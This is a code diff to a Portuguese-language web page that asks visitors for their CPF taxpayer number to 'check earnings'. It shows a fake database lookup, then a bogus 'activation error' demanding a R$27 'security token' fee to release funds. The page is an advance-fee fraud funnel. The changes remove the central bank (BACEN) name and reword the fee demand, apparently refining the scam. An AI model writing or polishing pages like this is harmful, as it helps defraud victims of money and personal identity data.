@@ -104,7 +104,7 @@
         <div id="p2" class="page">
             <h2 class="text-xl font-black text-center mb-8 italic uppercase">PARA CONSULTAR SEUS RENDIMENTOS INSIRA SEU CPF ABAIXO:</h2>
             <input type="tel" id="cpf_user" oninput="mask(this, '###.###.###-##')" class="w-full p-5 bg-gray-100 rounded-full outline-none font-bold text-center text-xl mb-6 border-2 border-transparent focus:border-green-500" placeholder="000.000.000-00">
-            <button onclick="loader(3, 4, 'Consultando Banco de Dados Central (BACEN/API)...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
+            <button onclick="loader(3, 4, 'Consultando Banco de Dados Central (API)...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
         </div>
 
         <div id="p3" class="page text-center py-20">
@@ -158,7 +158,7 @@
         <div id="p9" class="page text-center">
             <div class="border-t-8 border-red-600 p-6 shadow-xl">
                 <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Erro de Ativação</h3>
-                <p class="text-sm mb-6">O Servidor não localizou o pagamento da <b>Taxa de Chave para Saque de Rendimentos (TAC).</b> Realize o pagamento do seu Token de Segurança para validar o Protocolo 892 e liberar o resgate imediatamente..</p>
+                <p class="text-sm mb-6">O Servidor não localizou o pagamento da <b>Taxa de Chave para Saque de Rendimentos (TAC).</b> Realize o pagamento da taxa do seu Token de Segurança para validar o Protocolo 892 e liberar o resgate imediatamente..</p>
                 <div class="bg-gray-100 p-6 rounded-xl mb-6"><p class="text-4xl font-black">R$ 27,00</p></div>
                 <button onclick="nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR CHAVE</button>
             </div>
